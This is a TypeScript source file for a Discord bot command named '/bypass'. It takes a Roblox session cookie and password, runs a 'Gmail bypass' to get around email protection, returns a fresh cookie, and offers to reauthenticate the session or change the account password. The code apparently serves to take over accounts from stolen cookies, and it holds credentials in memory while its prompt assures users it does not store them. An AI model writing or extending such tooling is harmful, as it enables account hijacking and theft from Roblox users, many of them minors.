import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type ModalSubmitInteraction,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';
import { runResetAction, runChangePasswordAction } from '../../lib/actions';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Attempt Gmail Bypassing (With API)')
  .addStringOption((opt) =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

const noEmailSessions = new Map<string, { cookie: string; password: string }>();

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const pwValid = await Roblox.validatePassword(validation.username!, password);
    if (!pwValid.valid) {
      const embed = buildErrorEmbed(
        `✧ **Invalid Password**\n────\n` +
        `⭑ The provided password is incorrect for this account.\n` +
        `⭑ Please try again.`
      );
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const result = await runBypassAction(rawCookie, password);
    if (result.success) {
      const id = result.newCookie ? Math.random().toString(36).slice(2, 10) : '';
      const row = result.newCookie ? buildCopyButtons(id, 'bypass', result.newCookie, false) : undefined;
      await interaction.editReply({ embeds: [result.embed], components: row ? [row] : [] });
      return;
    }

    if (result.noEmail) {
      const sessionId = Math.random().toString(36).slice(2, 10);
      noEmailSessions.set(sessionId, { cookie: rawCookie, password });
      setTimeout(() => noEmailSessions.delete(sessionId), 600000);

      const embed = buildBaseEmbed(
        '𖣐 No Email Detected',
        `✧ **Account:** ${result.username}\n` +
        `────\n` +
        `⭑ No verified email found on this account.\n` +
        `⭑ You can reauthenticate (reset cookie) or change the password.\n` +
        `⭑ Your credentials were not logged.`
      );

      const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
        new ButtonBuilder()
          .setCustomId(`bypass_reauth_${sessionId}`)
          .setLabel('🔄 Reauth')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`bypass_resetpw_${sessionId}`)
          .setLabel('🔑 Reset Password')
          .setStyle(ButtonStyle.Secondary)
      );
      await interaction.editReply({ embeds: [embed], components: [row] });
      return;
    }

    await interaction.editReply({ embeds: [result.embed] });
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;

  const customId = interaction.customId;
  if (!customId.startsWith('bypass_reauth_') && !customId.startsWith('bypass_resetpw_')) return;

  const parts = customId.split('_');
  const action = parts[1];
  const id = parts[2];
  const session = noEmailSessions.get(id);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
    return;
  }

  if (action === 'reauth') {
    const result = await runResetAction(session.cookie);
    if (result.success && result.newCookie) {
      const newId = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(newId, 'reset', result.newCookie, false);
      await interaction.reply({ embeds: [result.embed], components: [row], flags: MessageFlags.Ephemeral });
    } else {
      await interaction.reply({ embeds: [result.embed], flags: MessageFlags.Ephemeral });
    }
    noEmailSessions.delete(id);
    return;
  }

  if (action === 'resetpw') {
    const modal = new ModalBuilder()
      .setCustomId(`bypass_resetpw_modal_${id}`)
      .setTitle('Reset Password');
    const input = new TextInputBuilder()
      .setCustomId('new_password')
      .setLabel('New Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Enter your new password');
    modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
    await interaction.showModal(modal);
    return;
  }
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const parts = interaction.customId.split('_');
  const id = parts[3];
  const session = noEmailSessions.get(id);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const newPassword = interaction.fields.getTextInputValue('new_password');
  const result = await runChangePasswordAction(session.cookie, session.password, newPassword);
  await interaction.editReply({ embeds: [result.embed] });
  noEmailSessions.delete(id);
}

export const bypassCommand: Command = { data, execute, handleButton, handleModal };